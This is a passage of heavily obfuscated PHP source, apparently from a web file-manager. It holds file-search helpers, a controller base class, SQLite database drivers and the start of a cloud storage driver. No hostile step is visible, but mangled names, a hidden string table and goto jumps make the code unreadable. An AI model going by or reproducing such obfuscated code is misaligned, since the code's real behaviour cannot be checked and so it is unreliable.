(stripos($³ß»ùù¾, $§‚ßˆãÍ) !== !1 || stripos($ûÚÔµİ, $§‚ßˆãÍ) !== !1) { $™·“Œ´[] = $à±•¤Á‘[$ĞõÚÔĞŸ[475]]; } } if (!$™·“Œ´) { return; } $¤ ÖñšÁ = array($ĞõÚÔĞŸ[500] => array($ĞõÚÔĞŸ[7], $™·“Œ´), $ĞõÚÔĞŸ[1764] => 0, $ĞõÚÔĞŸ[33] => $ĞõÚÔĞŸ[2084] . $ÅÔ¼Ì‡ö); $ÇÍÉÚ¤§ = Model($ĞõÚÔĞŸ[502])->field($ĞõÚÔĞŸ[87])->where($¤ ÖñšÁ)->select(); $ÇÍÉÚ¤§ = array_to_keyvalue($ÇÍÉÚ¤§, $ĞõÚÔĞŸ[12], $ĞõÚÔĞŸ[87]); $è°×«Ú = array_unique($ÇÍÉÚ¤§); $this->_listSearchMerge($õ£Ú–ª•, $¹‚œÕŸÎ, $ñ„š¾», $è°×«Ú); } private function _listSearchMerge(&$ŸÛ•Õ§—, $Ü¯Ÿª–», $ğ”»£µå, $æœš¿â˜) { $ùŒçˆ» =& $_SERVER[Ş­ğŠìÒ]; if (!$æœš¿â˜) { return; } $ôª Ûï“ = array_to_keyvalue($ŸÛ•Õ§—[$ùŒçˆ»[445]], $ùŒçˆ»[12], $ùŒçˆ»[193]); $Ü¸»ôô· = array_diff($æœš¿â˜, $ôª Ûï“); if (!$Ü¸»ôô·) { return; } $·‚á¦¤Ğ = array($ùŒçˆ»[193] => array($ùŒçˆ»[7], $Ü¸»ôô·)); $š™İ¡ò = $this->field($ğ”»£µå)->where($·‚á¦¤Ğ)->select(); if (!$š™İ¡ò) { return; } $ÇüÎŠ®¦ = array(); foreach ($š™İ¡ò as $ıÛ¹¾Ÿ’) { if ($this->_listSearchFilter($ıÛ¹¾Ÿ’, $Ü¯Ÿª–»)) { $ÇüÎŠ®¦[] = $ıÛ¹¾Ÿ’; } } $ŸÛ•Õ§—[$ùŒçˆ»[445]] = array_merge($ÇüÎŠ®¦, $ŸÛ•Õ§—[$ùŒçˆ»[445]]); $ŸÛ•Õ§—[$ùŒçˆ»[442]][$ùŒçˆ»[443]] += count($ÇüÎŠ®¦); } private function _listSearchFilter($ŠÊÌº¯, $´ûç¢ë) { $øÉ¸½ïº =& $_SERVER[Ş­ğŠìÒ]; $ú«úÚÊ = $ŠÊÌº¯[$øÉ¸½ïº[485]] == $øÉ¸½ïº[91]; if (!strstr($ŠÊÌº¯[$øÉ¸½ïº[584]], $øÉ¸½ïº[50] . $´ûç¢ë[$øÉ¸½ïº[192]] . $øÉ¸½ïº[50])) { return !1; } if (isset($´ûç¢ë[$øÉ¸½ïº[486]]) && $´ûç¢ë[$øÉ¸½ïº[486]] != $øÉ¸½ïº[843]) { if ($´ûç¢ë[$øÉ¸½ïº[486]] == $øÉ¸½ïº[78] && !$ú«úÚÊ) { return !1; } if ($´ûç¢ë[$øÉ¸½ïº[486]] != $øÉ¸½ïº[78] && $ú«úÚÊ) { return !1; } if (!strstr($ŠÊÌº¯[$øÉ¸½ïº[169]], $øÉ¸½ïº[50] . $´ûç¢ë[$øÉ¸½ïº[486]] . $øÉ¸½ïº[50])) { return !1; } } if (isset($´ûç¢ë[$øÉ¸½ïº[2232]]) && $´ûç¢ë[$øÉ¸½ïº[2232]] < $ŠÊÌº¯[$øÉ¸½ïº[79]]) { return !1; } if (isset($´ûç¢ë[$øÉ¸½ïº[2233]]) && $´ûç¢ë[$øÉ¸½ïº[2233]] > $ŠÊÌº¯[$øÉ¸½ïº[79]]) { return !1; } if (isset($´ûç¢ë[$øÉ¸½ïº[662]]) && $´ûç¢ë[$øÉ¸½ïº[662]] != $ŠÊÌº¯[$øÉ¸½ïº[529]]) { return !1; } return !0; } public function listSearchChildren($¨ò¾Ğ‚‘, $²ü¯ö‰½ = 5000) { $©ôâŞìğ =& $_SERVER[Ş­ğŠìÒ]; $ÅÀı’²š = array(); $ÄµÄÓ¥‡ = $this->sourceInfo($¨ò¾Ğ‚‘); $¨­©×Ë˜ = array($©ôâŞìğ[584] => array($©ôâŞìğ[459], $ÄµÄÓ¥‡[$©ôâŞìğ[584]] . $ÄµÄÓ¥‡[$©ôâŞìğ[193]] . $©ôâŞìğ[613])); $›±À’äæ = $this->field($©ôâŞìğ[79])->where($¨­©×Ë˜)->limit($²ü¯ö‰½ + 1)->select(); $”õèı‰ = is_array($›±À’äæ) ? count($›±À’äæ) : 0; if ($”õèı‰ > $²ü¯ö‰½) { return $this->_listSearchChildrenNear($¨ò¾Ğ‚‘, $²ü¯ö‰½); } $§î¦˜—½ = $this->field($©ôâŞìğ[193])->where($¨­©×Ë˜)->select(); $ÅÀı’²š = array_to_keyvalue($§î¦˜—½, $©ôâŞìğ[12], $©ôâŞìğ[193]); return $ÅÀı’²š; } private function _listSearchChildrenNear($çÀâ‹Ü³, $›¨É°±) { $œËÄ˜ =& $_SERVER[Ş­ğŠìÒ]; $Ùä¶ŠŠæ = array(); $ç„÷¨Å = array($œËÄ˜[192] => $çÀâ‹Ü³); $äü÷ßü€ = $this->field($œËÄ˜[2234])->where($ç„÷¨Å)->select(); $ ôÀ±  = array_to_keyvalue(array_filter_by_field($äü÷ßü€, $œËÄ˜[485], $œËÄ˜[91]), $œËÄ˜[12], $œËÄ˜[193]); $Ùä¶ŠŠæ = array_merge($Ùä¶ŠŠæ, array_to_keyvalue($äü÷ßü€, $œËÄ˜[12], $œËÄ˜[193])); if (!$ ôÀ± ) { return $Ùä¶ŠŠæ; } $ç„÷¨Å = array($œËÄ˜[192] => array($œËÄ˜[7], $ ôÀ± )); $äü÷ßü€ = $this->field($œËÄ˜[2234])->where($ç„÷¨Å)->limit($›¨É°±)->select(); $Ùä¶ŠŠæ = array_merge($Ùä¶ŠŠæ, array_to_keyvalue($äü÷ßü€, $œËÄ˜[12], $œËÄ˜[193])); $Ùä¶ŠŠæ = array_slice($Ùä¶ŠŠæ, 0, intval($›¨É°±)); return $Ùä¶ŠŠæ; } private function _listSearchBindPinyin($£¸çé®è, &$§šµÒšÊ, &$¹àÃñª) { $äÔäğ¸Ê =& $_SERVER[Ş­ğŠìÒ]; if (!isset($£¸çé®è[$äÔäğ¸Ê[2062]]) || !$£¸çé®è[$äÔäğ¸Ê[2062]]) { return; } if (!Input::check($£¸çé®è[$äÔäğ¸Ê[2062]], $äÔäğ¸Ê[394]) || strlen($£¸çé®è[$äÔäğ¸Ê[2062]]) < 2) { return; } $º¥ü°ã = "\114\x45\x46\124\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\151\157\x5f\163\157\165\x72\143\145\137\155\145\164\141\40\x6d\145\164\141\40\157\x6e\40\163\157\x75\x72\143\145\x2e\163\157\165\x72\143\145\x49\x44\x20\75\x20\x6d\x65\164\141\x2e\x73\157\165\162\x63\145\111\104"; $íí¤ÎÕ = array(); $¹àÃñª = str_replace(array($äÔäğ¸Ê[262], $äÔäğ¸Ê[53], $äÔäğ¸Ê[2235]), $äÔäğ¸Ê[12], $¹àÃñª); $¹àÃñª = $äÔäğ¸Ê[511] . str_replace($äÔäğ¸Ê[50], $äÔäğ¸Ê[512], $¹àÃñª); $°­ÎøÉÔ = $§šµÒšÊ[$äÔäğ¸Ê[32]]; unset($§šµÒšÊ[$äÔäğ¸Ê[32]]); foreach ($§šµÒšÊ as $¶ïáÙòŸ => $µ¾áæ’à) { $íí¤ÎÕ[$äÔäğ¸Ê[511] . $¶ïáÙòŸ] = $µ¾áæ’à; } foreach ($°­ÎøÉÔ as $§ĞËÑ¨) { $íí¤ÎÕ[] = array($äÔäğ¸Ê[516] => $§ĞËÑ¨, $äÔäğ¸Ê[1074] => $äÔäğ¸Ê[2066], array($äÔäğ¸Ê[2236] => $§ĞËÑ¨, $äÔäğ¸Ê[2237] => array($äÔäğ¸Ê[7], array($äÔäğ¸Ê[538], $äÔäğ¸Ê[537])))); } $this->join($º¥ü°ã); $§šµÒšÊ = $íí¤ÎÕ; } private function _parseSearchWhere($—²œ¦ÀÂ) { $æÁ·–—à =& $_SERVER[Ş­ğŠìÒ]; $ïÓá×şî = array(); if (isset($—²œ¦ÀÂ[$æÁ·–—à[827]]) && $—²œ¦ÀÂ[$æÁ·–—à[827]]) { $ïÓá×şî[$æÁ·–—à[88]] = array($æÁ·–—à[2238], $—²œ¦ÀÂ[$æÁ·–—à[827]]); } if (isset($—²œ¦ÀÂ[$æÁ·–—à[828]]) && $—²œ¦ÀÂ[$æÁ·–—à[828]]) { $¥‘ıÄƒ = array($æÁ·–—à[2239], $—²œ¦ÀÂ[$æÁ·–—à[828]]); if ($ïÓá×şî[$æÁ·–—à[88]]) { $ïÓá×şî[$æÁ·–—à[88]] = array($ïÓá×şî[$æÁ·–—à[88]], $¥‘ıÄƒ, $æÁ·–—à[2240]); } else { $ïÓá×şî[$æÁ·–—à[88]] = $¥‘ıÄƒ; } } if (isset($—²œ¦ÀÂ[$æÁ·–—à[2232]]) && $—²œ¦ÀÂ[$æÁ·–—à[2232]] > 0) { $ïÓá×şî[$æÁ·–—à[79]] = array($æÁ·–—à[2238], $—²œ¦ÀÂ[$æÁ·–—à[2232]]); } if (isset($—²œ¦ÀÂ[$æÁ·–—à[2233]]) && $—²œ¦ÀÂ[$æÁ·–—à[2233]]) { $¥‘ıÄƒ = array($æÁ·–—à[2239], $—²œ¦ÀÂ[$æÁ·–—à[2233]]); if ($ïÓá×şî[$æÁ·–—à[79]]) { $ïÓá×şî[$æÁ·–—à[79]] = array($ïÓá×şî[$æÁ·–—à[79]], $¥‘ıÄƒ, $æÁ·–—à[2240]); } else { $ïÓá×şî[$æÁ·–—à[79]] = $¥‘ıÄƒ; } } if (isset($—²œ¦ÀÂ[$æÁ·–—à[662]]) && $—²œ¦ÀÂ[$æÁ·–—à[662]]) { $ïÓá×şî[] = array($æÁ·–—à[529] => $—²œ¦ÀÂ[$æÁ·–—à[662]], $æÁ·–—à[527] => $—²œ¦ÀÂ[$æÁ·–—à[662]], $æÁ·–—à[1074] => $æÁ·–—à[2066]); } if (isset($—²œ¦ÀÂ[$æÁ·–—à[486]]) && $—²œ¦ÀÂ[$æÁ·–—à[486]]) { $ÕöàƒÍó = $—²œ¦ÀÂ[$æÁ·–—à[486]]; if ($ÕöàƒÍó == $æÁ·–—à[78]) { $ïÓá×şî[$æÁ·–—à[485]] = 1; } else { if ($ÕöàƒÍó == $æÁ·–—à[2241]) { $ïÓá×şî[$æÁ·–—à[485]] = 0; } else { if ($ÕöàƒÍó) { $ÕöàƒÍó = is_array($ÕöàƒÍó) ? $ÕöàƒÍó : explode($æÁ·–—à[50], $ÕöàƒÍó); $ïÓá×şî[$æÁ·–—à[486]] = array($æÁ·–—à[492], $ÕöàƒÍó); $ïÓá×şî[$æÁ·–—à[485]] = 0; } } } } $this->_parseSearchParent($—²œ¦ÀÂ, $ïÓá×şî); if (isset($—²œ¦ÀÂ[$æÁ·–—à[2062]]) && trim($—²œ¦ÀÂ[$æÁ·–—à[2062]])) { $Ê’ıõ = trim($—²œ¦ÀÂ[$æÁ·–—à[2062]]); $Ÿ‚æ¿©Ô = explode($æÁ·–—à[53], $Ê’ıõ); if (strlen($Ê’ıõ) > 2 && (substr($Ê’ıõ, 0, 1) == $æÁ·–—à[121] && substr($Ê’ıõ, -1) == $æÁ·–—à[121]) || substr($Ê’ıõ, 0, 1) == $æÁ·–—à[58] && substr($Ê’ıõ, -1) == $æÁ·–—à[58]) { $Ê’ıõ = substr($Ê’ıõ, 1, -1); $Ÿ‚æ¿©Ô = array($Ê’ıõ); } $ïÓá×şî[$æÁ·–—à[32]] = array(array($æÁ·–—à[612], $æÁ·–—à[2064] . $Ê’ıõ . $æÁ·–—à[2064])); if (count($Ÿ‚æ¿©Ô) > 1) { $ïÓá×şî[$æÁ·–—à[32]] = array(); foreach ($Ÿ‚æ¿©Ô as $ª–È–û°) { if (!trim($ª–È–û°)) { continue; } $ïÓá×şî[$æÁ·–—à[32]][] = array($æÁ·–—à[612], $æÁ·–—à[2064] . trim($ª–È–û°) . $æÁ·–—à[2064]); } } } return $ïÓá×şî; } private function _parseSearchParent($…”–óÛ, &$¯½Áó¤) { $¸“’¿ªß =& $_SERVER[Ş­ğŠìÒ]; if (!isset($…”–óÛ[$¸“’¿ªß[192]]) || !$…”–óÛ[$¸“’¿ªß[192]]) { return; } $ì…‘°â = $this->pathInfo($…”–óÛ[$¸“’¿ªß[192]]); $°ÎúÇâ = $ì…‘°â[$¸“’¿ªß[192]] . $¸“’¿ªß[12] === $¸“’¿ªß[228]; $©ŞºªĞ = $ì…‘°â[$¸“’¿ªß[190]] == $¸“’¿ªß[578]; if ($ì…‘°â[$¸“’¿ªß[595]] == $¸“’¿ªß[596]) { $ø§¹‘ à = $this->sourceInfo($…”–óÛ[$¸“’¿ªß[192]]); $ì…‘°â[$¸“’¿ªß[584]] = $ø§¹‘ à[$¸“’¿ªß[584]]; } $¯½Áó¤[$¸“’¿ªß[652]] = array($¸“’¿ªß[612], $ì…‘°â[$¸“’¿ªß[584]] . $…”–óÛ[$¸“’¿ªß[192]] . $¸“’¿ªß[613]); $‚çÓò°Î = isset($…”–óÛ[$¸“’¿ªß[1921]]) && in_array($¸“’¿ªß[578], $…”–óÛ[$¸“’¿ªß[1921]]); if (!$‚çÓò°Î || !$©ŞºªĞ || !$°ÎúÇâ || !$ì…‘°â[$¸“’¿ªß[487]]) { return; } if (!AuthModel::authCheckRoot($ì…‘°â[$¸“’¿ªß[487]][$¸“’¿ªß[488]])) { return; } $œë±³ = $ì…‘°â[$¸“’¿ªß[569]] . $¸“’¿ªß[12]; if ($œë±³ == $¸“’¿ªß[91]) { unset($¯½Áó¤[$¸“’¿ªß[652]]); $¯½Áó¤[$¸“’¿ªß[190]] = self::TYPE_GROUP; return; } $åŞ•‚×ò = Model($¸“’¿ªß[585])->groupChildrenAll($œë±³); $¼à’£ŸÜ = count($åŞ•‚×ò); if ($¼à’£ŸÜ <= 1) { return; } $‘É¤ÚĞ´ = array($¸“’¿ªß[192] => 0, $¸“’¿ªß[190] => self::TYPE_GROUP, $¸“’¿ªß[569] => array($¸“’¿ªß[7], $åŞ•‚×ò)); $ôœ¿½Ï© = $this->field($¸“’¿ªß[2242])->where($‘É¤ÚĞ´)->limit($¼à’£ŸÜ)->select(); $¯½Áó¤[$¸“’¿ªß[652]] = array(); foreach ($ôœ¿½Ï© as $­”ÔÎºŸ) { $¯½Áó¤[$¸“’¿ªß[652]][] = array($¸“’¿ªß[612], $¸“’¿ªß[594] . $­”ÔÎºŸ[$¸“’¿ªß[193]] . $¸“’¿ªß[613]); } $¯½Áó¤[$¸“’¿ªß[652]][] = $¸“’¿ªß[2066]; } } goto Bó¾¤·Êµ; D ¡îóìàÏ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÁÔÉİş­ =& $_SERVER[Ş­ğŠìÒ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÁÔÉİş­[6]] =& $config; $this->values[$ÁÔÉİş­[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÁÔÉİş­[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($¶Õ«‹œ) { if (1 === func_num_args()) { $this->{$¶Õ«‹œ} = new $¶Õ«‹œ(); } else { $Š··Ó§¥ = new ReflectionClass($¶Õ«‹œ); $î•ö’¾Ù = func_get_args(); array_shift($î•ö’¾Ù); $this->{$¶Õ«‹œ} = $Š··Ó§¥->newInstanceArgs($î•ö’¾Ù); } return $this->{$¶Õ«‹œ}; } public function routeBind($ÙÔ€—â—, $×ÅÇµæµ, $Å…·ËÓÅ = 3) { $©ÍÆÓíì =& $_SERVER[Ş­ğŠìÒ]; $££ùş° = $this->in[$©ÍÆÓíì[9]]; $ÙÔ€—â— = str_replace($©ÍÆÓíì[10], $©ÍÆÓíì[11], trim(trim($ÙÔ€—â—, $©ÍÆÓíì[8]), $©ÍÆÓíì[12])); if (!$ÙÔ€—â— || count($££ùş°) <= $Å…·ËÓÅ) { return !1; } $§É–òİ¶ = !0; $íŞËÓ› = explode($©ÍÆÓíì[8], $ÙÔ€—â—); for ($õ—ƒä„¸ = 0; $õ—ƒä„¸ < count($íŞËÓ›); $õ—ƒä„¸++) { if ($íŞËÓ›[$õ—ƒä„¸] != $££ùş°[$Å…·ËÓÅ + $õ—ƒä„¸]) { $§É–òİ¶ = !1; break; } } if (!$§É–òİ¶) { return; } call_user_func_array(array($this, $×ÅÇµæµ), array()); } public function routeArgs($Çğõ¢‘” = 3) { $‰ŞšÂµ¤ = $this->in[$_SERVER[Ş­ğŠìÒ][9]]; if (count($‰ŞšÂµ¤) <= $Çğõ¢‘”) { return array(); } $˜Ñúô’¡ = array(); for ($÷õ­ÈØÈ = $Çğõ¢‘”; $÷õ­ÈØÈ < count($‰ŞšÂµ¤); $÷õ­ÈØÈ += 2) { $˜Ñúô’¡[$‰ŞšÂµ¤[$÷õ­ÈØÈ]] = $‰ŞšÂµ¤[$÷õ­ÈØÈ + 1]; $this->in[$‰ŞšÂµ¤[$÷õ­ÈØÈ]] = $‰ŞšÂµ¤[$÷õ­ÈØÈ + 1]; } return $˜Ñúô’¡; } protected function assign($Å½Ó×, $ßó„ë¦–) { $this->values[$Å½Ó×] = $ßó„ë¦–; } protected function display($êäŠòâÚ) { ob_end_clean(); extract($this->values); require $this->tpl . $êäŠòâÚ; } } class DbSqliteBase extends Db { public function __construct($¿£ËºÌİ = '') { $ß»ï­•Ú =& $_SERVER[Ş­ğŠìÒ]; if (!extension_loaded($ß»ï­•Ú[13])) { think_exception(think_lang($ß»ï­•Ú[14]) . $ß»ï­•Ú[15]); } if (!empty($¿£ËºÌİ)) { if (!isset($¿£ËºÌİ[$ß»ï­•Ú[16]])) { $¿£ËºÌİ[$ß»ï­•Ú[16]] = 438; } $this->config = $¿£ËºÌİ; if (empty($this->config[$ß»ï­•Ú[17]])) { $this->config[$ß»ï­•Ú[17]] = array(); } } } public function connect($à´¢™´ª = '', $éĞùã = 0) { $š™Œ =& $_SERVER[Ş­ğŠìÒ]; if (!isset($this->linkID[$éĞùã])) { if (empty($à´¢™´ª)) { $à´¢™´ª = $this->config; } $ô£ª¨é = !empty($à´¢™´ª[$š™Œ[17]][$š™Œ[18]]) ? $à´¢™´ª[$š™Œ[17]][$š™Œ[18]] : $this->pconnect; $İòã™­¯ = $ô£ª¨é ? $š™Œ[19] : $š™Œ[20]; $this->linkID[$éĞùã] = $İòã™­¯($à´¢™´ª[$š™Œ[21]], $à´¢™´ª[$š™Œ[16]]); if (!$this->linkID[$éĞùã]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$éĞùã], 30000); if (1 != think_config($š™Œ[22])) { unset($this->config); } } return $this->linkID[$éĞùã]; } public function free() { $this->queryID = null; } public function query($óËÈüÉÈ) { $†—Ò‰ó =& $_SERVER[Ş­ğŠìÒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $óËÈüÉÈ; if ($this->queryID) { $this->free(); } think_action_status($†—Ò‰ó[23], 1); think_status($†—Ò‰ó[24]); $this->queryID = sqlite_query($this->_linkID, $óËÈüÉÈ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÜŞ‰êÖÓ = $this->getAll(); return $ÜŞ‰êÖÓ; } } public function execute($‘Îœ±ğÌ) { $Ñâ˜‘èì =& $_SERVER[Ş­ğŠìÒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‘Îœ±ğÌ; if ($this->queryID) { $this->free(); } think_action_status($Ñâ˜‘èì[25], 1); think_status($Ñâ˜‘èì[24]); $İû÷òú = sqlite_exec($this->_linkID, $‘Îœ±ğÌ); $this->debug(); if (!1 === $İû÷òú) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ş­ğŠìÒ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ŞÆ¹®½ı = sqlite_query($this->_linkID, $_SERVER[Ş­ğŠìÒ][27]); if (!$ŞÆ¹®½ı) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $— İ•º‰ = sqlite_query($this->_linkID, $_SERVER[Ş­ğŠìÒ][28]); if (!$— İ•º‰) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÌëŒÛ»Ö = array(); if ($this->numRows > 0) { for ($Ôµìåó÷ = 0; $Ôµìåó÷ < $this->numRows; $Ôµìåó÷++) { $ÌëŒÛ»Ö[$Ôµìåó÷] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ÌëŒÛ»Ö; } public function getFields($¥Ì·Êº·) { $õí½«² =& $_SERVER[Ş­ğŠìÒ]; $Ú €—³  = $this->query($õí½«²[29] . $¥Ì·Êº· . $õí½«²[30]); $˜‰ÉºÌÕ = array(); if ($Ú €—³ ) { foreach ($Ú €—³  as $¿Ï®ÈÎº => $ÇÑÎó–õ) { $˜‰ÉºÌÕ[$ÇÑÎó–õ[$õí½«²[31]]] = array($õí½«²[32] => $ÇÑÎó–õ[$õí½«²[31]], $õí½«²[33] => $ÇÑÎó–õ[$õí½«²[34]], $õí½«²[35] => (bool) ($ÇÑÎó–õ[$õí½«²[36]] === $õí½«²[12]), $õí½«²[37] => $ÇÑÎó–õ[$õí½«²[38]], $õí½«²[39] => strtolower($ÇÑÎó–õ[$õí½«²[40]]) == $õí½«²[41], $õí½«²[42] => strtolower($ÇÑÎó–õ[$õí½«²[43]]) == $õí½«²[44]); } } return $˜‰ÉºÌÕ; } public function getTables($Ö´èªÎ© = '') { $ó·èÃô =& $_SERVER[Ş­ğŠìÒ]; $æô‚ı¤Ù = $this->query($ó·èÃô[45] . $ó·èÃô[46] . $ó·èÃô[47]); $ÌÏöÊª­ = array(); foreach ($æô‚ı¤Ù as $îğù¤’Ã => $Ğå¼ñÍÕ) { $ÌÏöÊª­[$îğù¤’Ã] = current($Ğå¼ñÍÕ); } return $ÌÏöÊª­; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ˆ¸ï¥Ï =& $_SERVER[Ş­ğŠìÒ]; $Òı¼Ê°ù = sqlite_last_error($this->_linkID); $this->error = $Òı¼Ê°ù . $ˆ¸ï¥Ï[4] . sqlite_error_string($Òı¼Ê°ù); if ($ˆ¸ï¥Ï[12] != $this->queryStr) { $this->error .= LNG($ˆ¸ï¥Ï[48]) . $this->queryStr; } think_trace($this->error, $ˆ¸ï¥Ï[12], $ˆ¸ï¥Ï[49]); return $this->error; } public function escapeString($ôŞ¯Î‘í) { return sqlite_escape_string($ôŞ¯Î‘í); } public function parseLimit($âóİ²Ò ) { $×“£šœÇ =& $_SERVER[Ş­ğŠìÒ]; $î´ğà¿ñ = $×“£šœÇ[12]; if (!empty($âóİ²Ò )) { $âóİ²Ò  = explode($×“£šœÇ[50], $âóİ²Ò ); if (count($âóİ²Ò ) > 1) { $î´ğà¿ñ .= $×“£šœÇ[51] . $âóİ²Ò [1] . $×“£šœÇ[52] . $âóİ²Ò [0] . $×“£šœÇ[53]; } else { $î´ğà¿ñ .= $×“£šœÇ[51] . $âóİ²Ò [0] . $×“£šœÇ[53]; } } return $î´ğà¿ñ; } } class DbSqlite3Base extends Db { public function __construct($ˆøüà™Š = '') { $ø”…Îğ§ =& $_SERVER[Ş­ğŠìÒ]; if (!class_exists($ø”…Îğ§[54])) { think_exception(think_lang($ø”…Îğ§[14]) . $ø”…Îğ§[55]); } if (!empty($ˆøüà™Š)) { if (!isset($ˆøüà™Š[$ø”…Îğ§[16]])) { $ˆøüà™Š[$ø”…Îğ§[16]] = 438; } $this->config = $ˆøüà™Š; if (empty($this->config[$ø”…Îğ§[17]])) { $this->config[$ø”…Îğ§[17]] = array(); } } } public function connect($—ÅÙÂÕ¿ = '', $·™ÌÀ¸º = 0) { $Æ­àÎëü =& $_SERVER[Ş­ğŠìÒ]; if (!isset($this->linkID[$·™ÌÀ¸º])) { if (empty($—ÅÙÂÕ¿)) { $—ÅÙÂÕ¿ = $this->config; } $this->linkID[$·™ÌÀ¸º] = new SQLite3($—ÅÙÂÕ¿[$Æ­àÎëü[21]]); if (!$this->linkID[$·™ÌÀ¸º]) { think_exception($this->linkID[$·™ÌÀ¸º]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$·™ÌÀ¸º]->busyTimeout(30000); if (1 != think_config($Æ­àÎëü[22])) { unset($this->config); } } return $this->linkID[$·™ÌÀ¸º]; } public function free() { $this->queryID = null; } public function query($´·ÀÎªã) { $Šš°Öœ =& $_SERVER[Ş­ğŠìÒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $´·ÀÎªã; if ($this->queryID) { $this->free(); } think_action_status($Šš°Öœ[23], 1); think_status($Šš°Öœ[24]); $this->queryID = $this->_linkID->query($´·ÀÎªã); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $†¶Ñ«šŞ = $this->getAll(); $this->numRows = count($†¶Ñ«šŞ); return $†¶Ñ«šŞ; } } public function execute($ûãúö‘) { $Š°˜“Œô =& $_SERVER[Ş­ğŠìÒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ûãúö‘; if ($this->queryID) { $this->free(); } think_action_status($Š°˜“Œô[25], 1); think_status($Š°˜“Œô[24]); $Ò®ìØ¾¥ = $this->_linkID->exec($ûãúö‘); $this->debug(); if (!1 === $Ò®ìØ¾¥) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ş­ğŠìÒ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $áõñÄª = $this->_linkID->query($_SERVER[Ş­ğŠìÒ][27]); if (!$áõñÄª) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $·ıÊ¢„™ = $this->_linkID->query($_SERVER[Ş­ğŠìÒ][28]); if (!$·ıÊ¢„™) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ø—İ¹¨· = array(); while ($¾²¥•± = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ø—İ¹¨·[] = $¾²¥•±; } $this->queryID->reset(); return $Ø—İ¹¨·; } public function getFields($‚ä£¹) { $”Â³»¯ =& $_SERVER[Ş­ğŠìÒ]; $µ‰¬û¨ß = $this->query($”Â³»¯[29] . $‚ä£¹ . $”Â³»¯[30]); $ûî¶‚ã¿ = array(); if ($µ‰¬û¨ß) { foreach ($µ‰¬û¨ß as $Íå¯–÷… => $†ğÙ¶ˆÁ) { $ûî¶‚ã¿[$†ğÙ¶ˆÁ[$”Â³»¯[32]]] = array($”Â³»¯[32] => $†ğÙ¶ˆÁ[$”Â³»¯[32]], $”Â³»¯[33] => $†ğÙ¶ˆÁ[$”Â³»¯[33]], $”Â³»¯[35] => (bool) ($†ğÙ¶ˆÁ[$”Â³»¯[35]] === $”Â³»¯[12]), $”Â³»¯[37] => $†ğÙ¶ˆÁ[$”Â³»¯[56]], $”Â³»¯[39] => (bool) $†ğÙ¶ˆÁ[$”Â³»¯[57]], $”Â³»¯[42] => (bool) $†ğÙ¶ˆÁ[$”Â³»¯[57]]); } } return $ûî¶‚ã¿; } public function getTables($ûßğ¶¾ = '') { $¾½™µóË =& $_SERVER[Ş­ğŠìÒ]; $ìîÏ©è¸ = $this->query($¾½™µóË[45] . $¾½™µóË[46] . $¾½™µóË[47]); $×şğ­ìŸ = array(); foreach ($ìîÏ©è¸ as $÷”Û™à => $‚İë­·ì) { $×şğ­ìŸ[$÷”Û™à] = current($‚İë­·ì); } return $×şğ­ìŸ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÚìÄú¬Æ =& $_SERVER[Ş­ğŠìÒ]; $this->error = $this->_linkID->lastErrorMsg(); if ($ÚìÄú¬Æ[12] != $this->queryStr) { $this->error .= LNG($ÚìÄú¬Æ[48]) . $this->queryStr; } think_trace($this->error, $ÚìÄú¬Æ[12], $ÚìÄú¬Æ[49]); return $this->error; } public function escapeString($¥±°ıÕ) { $Ìô¬Ö§ =& $_SERVER[Ş­ğŠìÒ]; if ($this->_linkID) { return $this->_linkID->escapeString($¥±°ıÕ); } return str_ireplace($Ìô¬Ö§[58], $Ìô¬Ö§[59], $¥±°ıÕ); } public function parseLimit($¢ºİİÔé) { $‰éÂü·Æ =& $_SERVER[Ş­ğŠìÒ]; $’¢õ©öŸ = $‰éÂü·Æ[12]; if (!empty($¢ºİİÔé)) { $¢ºİİÔé = explode($‰éÂü·Æ[50], $¢ºİİÔé); if (count($¢ºİİÔé) > 1) { $’¢õ©öŸ .= $‰éÂü·Æ[51] . $¢ºİİÔé[1] . $‰éÂü·Æ[52] . $¢ºİİÔé[0] . $‰éÂü·Æ[53]; } else { $’¢õ©öŸ .= $‰éÂü·Æ[51] . $¢ºİİÔé[0] . $‰éÂü·Æ[53]; } } return $’¢õ©öŸ; } } goto b­§İº; aÅ¤š»óÒã: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = 